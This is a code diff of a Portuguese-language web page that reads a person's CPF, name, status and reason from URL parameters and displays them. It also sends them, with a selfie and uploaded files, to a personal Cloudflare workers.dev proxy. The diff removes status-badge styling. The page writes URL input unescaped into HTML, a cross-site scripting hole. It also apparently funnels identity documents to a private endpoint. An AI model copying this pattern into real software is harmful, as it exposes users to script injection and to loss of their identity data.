@@ -185,25 +185,6 @@
             margin-top: 4px;
             line-height: 1.4;
         }
-        .status-badge {
-            display: inline-block;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-        .status-badge.indeferido {
-            background: #fee2e2;
-            color: #991b1b;
-        }
-        .status-badge.pendente {
-            background: #fff3cd;
-            color: #856404;
-        }
-        .status-badge.deferido {
-            background: #d4edda;
-            color: #155724;
-        }
     </style>
 </head>
 <body>
@@ -260,38 +241,22 @@
 
     <script>
     const urlParams = new URLSearchParams(window.location.search);
-    
-    // PEGA O MOTIVO DA URL (IGUAL VEM DA CONSULTA)
-    const motivo = urlParams.get('motivo') || '';
-    
     const dadosUsuario = {
         cpf: urlParams.get('cpf') || '',
         nome: urlParams.get('nome') || '',
         status: urlParams.get('status') || '',
         nascimento: urlParams.get('nascimento') || '',
-        motivo: motivo
+        motivo: urlParams.get('motivo') || ''  // ADICIONADO: PEGA O MOTIVO DA URL
     };
     
-    // Função para formatar status com badge
-    function getStatusBadge(status) {
-        const statusLower = status.toLowerCase();
-        let classe = 'pendente';
-        if (statusLower.includes('indeferido') || statusLower.includes('negado')) {
-            classe = 'indeferido';
-        } else if (statusLower.includes('deferido') || statusLower.includes('aprovado')) {
-            classe = 'deferido';
-        }
-        return `<span class="status-badge ${classe}">${status}</span>`;
-    }
-    
-    // Monta o HTML da info do usuário
+    // ADICIONADO: EXIBE O MOTIVO
     let infoHTML = `
         <p><strong>👤 Nome:</strong> ${dadosUsuario.nome || 'Não encontrado'}</p>
         <p><strong>📄 CPF:</strong> ${dadosUsuario.cpf || 'Não encontrado'}</p>
-        <p><strong>📊 Status:</strong> ${dadosUsuario.status ? getStatusBadge(dadosUsuario.status) : 'Não encontrado'}</p>
+        <p><strong>📊 Status:</strong> ${dadosUsuario.status || 'Não encontrado'}</p>
     `;
     
-    // Se tiver motivo, exibe com destaque
+    // ADICIONADO: SE TIVER MOTIVO, EXIBE COM DESTAQUE
     if (dadosUsuario.motivo && dadosUsuario.motivo.trim() !== '') {
         infoHTML += `
             <div class="motivo-box">
@@ -301,7 +266,7 @@
         `;
     } else {
         infoHTML += `
-            <p><strong>📝 Motivo:</strong> <span style="color:#999;">Não informado</span></p>
+            <p><strong>📝 Motivo:</strong> Não informado</p>
         `;
     }
     
@@ -428,7 +393,7 @@
             cpf: cpfLimpo,
             nome: dadosUsuario.nome,
             status: dadosUsuario.status || 'Pendente',
-            motivo: dadosUsuario.motivo || '',
+            motivo: dadosUsuario.motivo || '',  // ADICIONADO: ENVIA O MOTIVO
             selfie: selfie,
             arquivos: arquivos
         };
@@ -437,12 +402,14 @@
         console.log('📎 Arquivos:', arquivos.length);
         
         try {
+            // ✅ USA O WORKER
             const WORKER_URL = 'https://proxy-cors.diegoferreira-mm.workers.dev';
             
             const submitBtn = document.getElementById('submitBtn');
             submitBtn.disabled = true;
             submitBtn.innerHTML = '⏳ Enviando...';
             
+            // ✅ ENVIA COMO JSON (não FormData)
             const response = await fetch(WORKER_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
